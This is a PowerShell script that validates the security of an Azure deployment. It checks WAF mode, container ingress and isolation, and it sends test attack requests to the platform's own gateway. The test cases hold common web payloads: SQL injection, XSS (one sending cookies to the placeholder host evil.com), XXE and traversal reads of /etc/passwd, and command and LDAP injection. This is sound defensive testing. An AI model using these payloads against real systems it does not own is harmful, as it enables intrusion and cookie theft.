# LEGO Learning Platform - Security Validation Script

param(
    [Parameter(HelpMessage="Run security penetration tests")]
    [switch]$PenTest,
    
    [Parameter(HelpMessage="Check WAF rule effectiveness")]
    [switch]$WafTest,
    
    [Parameter(HelpMessage="Validate network security")]
    [switch]$NetworkTest,
    
    [Parameter(HelpMessage="Resource group name")]
    [string]$ResourceGroup = ""
)

Write-Host "🔒 LEGO Learning Platform - Security Validation" -ForegroundColor Green

# Get environment values
try {
    $envValues = azd env get-values | ConvertFrom-StringData
    if (-not $ResourceGroup) {
        $ResourceGroup = $envValues.AZURE_RESOURCE_GROUP
    }
} catch {
    Write-Host "❌ Could not get environment values. Make sure azd is initialized." -ForegroundColor Red
    exit 1
}

# Function to test WAF rules
function Test-WafRules {
    param($BaseUrl)
    
    Write-Host "`n🛡️ Testing WAF Rules:" -ForegroundColor Yellow
    
    $testCases = @(
        @{
            Name = "SQL Injection Test"
            Path = "/?id=1' OR '1'='1"
            Expected = "Blocked"
        },
        @{
            Name = "XSS Test"
            Path = "/?search=<script>alert('xss')</script>"
            Expected = "Blocked"
        },
        @{
            Name = "Directory Traversal"
            Path = "/../../../etc/passwd"
            Expected = "Blocked"
        },
        @{
            Name = "Command Injection"
            Path = "/?cmd=cat /etc/passwd"
            Expected = "Blocked"
        },
        @{
            Name = "Normal Request"
            Path = "/"
            Expected = "Allowed"
        }
    )
    
    foreach ($test in $testCases) {
        Write-Host "  Testing: $($test.Name)" -ForegroundColor White
        $url = "$BaseUrl$($test.Path)"
        
        try {
            $response = Invoke-WebRequest -Uri $url -TimeoutSec 10 -UseBasicParsing -ErrorAction SilentlyContinue
            $statusCode = $response.StatusCode
            
            if ($test.Expected -eq "Blocked" -and $statusCode -eq 403) {
                Write-Host "    ✅ Correctly blocked (403)" -ForegroundColor Green
            } elseif ($test.Expected -eq "Allowed" -and $statusCode -eq 200) {
                Write-Host "    ✅ Correctly allowed (200)" -ForegroundColor Green
            } else {
                Write-Host "    ⚠️ Unexpected response ($statusCode)" -ForegroundColor Yellow
            }
        } catch {
            if ($test.Expected -eq "Blocked") {
                Write-Host "    ✅ Request blocked or filtered" -ForegroundColor Green
            } else {
                Write-Host "    ❌ Request failed: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        
        Start-Sleep -Seconds 1  # Rate limiting
    }
}

# Function to validate network security
function Test-NetworkSecurity {
    Write-Host "`n🌐 Network Security Validation:" -ForegroundColor Yellow
    
    # Check if Container App is directly accessible
    if ($envValues.AZURE_CONTAINER_APP_INTERNAL_URL) {
        $internalUrl = $envValues.AZURE_CONTAINER_APP_INTERNAL_URL
        Write-Host "  Testing direct Container App access..." -ForegroundColor White
        
        try {
            $response = Invoke-WebRequest -Uri $internalUrl -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop
            Write-Host "    ❌ Container App is publicly accessible! This is a security risk." -ForegroundColor Red
        } catch {
            Write-Host "    ✅ Container App is properly isolated (not directly accessible)" -ForegroundColor Green
        }
    }
    
    # Check public endpoint
    if ($envValues.APPLICATION_GATEWAY_FQDN) {
        $publicUrl = "http://$($envValues.APPLICATION_GATEWAY_FQDN)"
        Write-Host "  Testing public endpoint access..." -ForegroundColor White
        
        try {
            $response = Invoke-WebRequest -Uri $publicUrl -TimeoutSec 10 -UseBasicParsing
            Write-Host "    ✅ Public endpoint accessible through Application Gateway" -ForegroundColor Green
        } catch {
            Write-Host "    ❌ Public endpoint not accessible: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}

# Function to check security configuration
function Test-SecurityConfiguration {
    Write-Host "`n🔧 Security Configuration Check:" -ForegroundColor Yellow
    
    # Check Application Gateway WAF configuration
    $appGateways = az network application-gateway list --resource-group $ResourceGroup 2>$null | ConvertFrom-Json
    if ($appGateways) {
        foreach ($gw in $appGateways) {
            Write-Host "  Application Gateway: $($gw.name)" -ForegroundColor White
            
            $wafConfig = $gw.webApplicationFirewallConfiguration
            if ($wafConfig.enabled) {
                Write-Host "    ✅ WAF Enabled" -ForegroundColor Green
                Write-Host "    Mode: $($wafConfig.firewallMode)" -ForegroundColor Cyan
                Write-Host "    Rule Set: $($wafConfig.ruleSetType) v$($wafConfig.ruleSetVersion)" -ForegroundColor Cyan
                
                if ($wafConfig.firewallMode -eq "Detection") {
                    Write-Host "    ⚠️ WAF in Detection mode - consider switching to Prevention for production" -ForegroundColor Yellow
                } else {
                    Write-Host "    ✅ WAF in Prevention mode" -ForegroundColor Green
                }
            } else {
                Write-Host "    ❌ WAF Disabled" -ForegroundColor Red
            }
        }
    }
    
    # Check Container App security
    $containerApps = az containerapp list --resource-group $ResourceGroup 2>$null | ConvertFrom-Json
    if ($containerApps) {
        foreach ($app in $containerApps) {
            Write-Host "  Container App: $($app.name)" -ForegroundColor White
            
            if ($app.properties.configuration.ingress.external -eq $false) {
                Write-Host "    ✅ Internal ingress only" -ForegroundColor Green
            } else {
                Write-Host "    ❌ External ingress enabled - security risk" -ForegroundColor Red
            }
            
            if ($app.identity -and $app.identity.type) {
                Write-Host "    ✅ Managed identity configured" -ForegroundColor Green
            } else {
                Write-Host "    ⚠️ No managed identity configured" -ForegroundColor Yellow
            }
        }
    }
}

# Function to run basic penetration tests
function Start-PenetrationTest {
    param($BaseUrl)
    
    Write-Host "`n🎯 Basic Penetration Testing:" -ForegroundColor Yellow
    Write-Host "⚠️ Only testing against your own infrastructure" -ForegroundColor Red
    
    # Test common attack vectors
    $attacks = @(
        @{ Name = "SQL Injection"; Payload = "1' UNION SELECT * FROM users--" },
        @{ Name = "XSS"; Payload = "<script>document.location='http://evil.com/cookie.php?c='+document.cookie</script>" },
        @{ Name = "XXE"; Payload = "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>" },
        @{ Name = "LDAP Injection"; Payload = "*)(uid=*))(|(uid=*" },
        @{ Name = "Command Injection"; Payload = "; cat /etc/passwd" },
        @{ Name = "Path Traversal"; Payload = "../../../etc/passwd%00" }
    )
    
    foreach ($attack in $attacks) {
        Write-Host "  Testing: $($attack.Name)" -ForegroundColor White
        
        # Test as query parameter
        $testUrl = "$BaseUrl/?test=$([System.Web.HttpUtility]::UrlEncode($attack.Payload))"
        
        try {
            $response = Invoke-WebRequest -Uri $testUrl -TimeoutSec 5 -UseBasicParsing -ErrorAction SilentlyContinue
            if ($response.StatusCode -eq 403) {
                Write-Host "    ✅ Attack blocked by WAF" -ForegroundColor Green
            } elseif ($response.StatusCode -eq 200) {
                Write-Host "    ⚠️ Request allowed - check response for vulnerabilities" -ForegroundColor Yellow
            }
        } catch {
            Write-Host "    ✅ Attack blocked or filtered" -ForegroundColor Green
        }
        
        Start-Sleep -Seconds 2  # Rate limiting
    }
}

# Main execution
Write-Host "🔍 Starting security validation..." -ForegroundColor Cyan

# Always run configuration check
Test-SecurityConfiguration

# Network security test
if ($NetworkTest -or (-not $PenTest -and -not $WafTest)) {
    Test-NetworkSecurity
}

# WAF testing
if ($WafTest -or $PenTest) {
    if ($envValues.APPLICATION_GATEWAY_FQDN) {
        $baseUrl = "http://$($envValues.APPLICATION_GATEWAY_FQDN)"
        Test-WafRules -BaseUrl $baseUrl
    } else {
        Write-Host "❌ No public endpoint found for WAF testing" -ForegroundColor Red
    }
}

# Penetration testing
if ($PenTest) {
    if ($envValues.APPLICATION_GATEWAY_FQDN) {
        $baseUrl = "http://$($envValues.APPLICATION_GATEWAY_FQDN)"
        Start-PenetrationTest -BaseUrl $baseUrl
    } else {
        Write-Host "❌ No public endpoint found for penetration testing" -ForegroundColor Red
    }
}

Write-Host "`n📋 Security Recommendations:" -ForegroundColor Yellow
Write-Host "  1. ✅ Ensure WAF is in Prevention mode for production" -ForegroundColor White
Write-Host "  2. ✅ Configure HTTPS with SSL certificates" -ForegroundColor White
Write-Host "  3. ✅ Set up custom WAF rules for application-specific threats" -ForegroundColor White
Write-Host "  4. ✅ Implement rate limiting and bot protection" -ForegroundColor White
Write-Host "  5. ✅ Regular security audits and penetration testing" -ForegroundColor White
Write-Host "  6. ✅ Monitor WAF logs for attack patterns" -ForegroundColor White
Write-Host "  7. ✅ Implement IP allowlist/blocklist as needed" -ForegroundColor White

Write-Host "`n✅ Security validation complete!" -ForegroundColor Green
Write-Host "💡 Run with -WafTest, -NetworkTest, or -PenTest for specific tests" -ForegroundColor Cyan
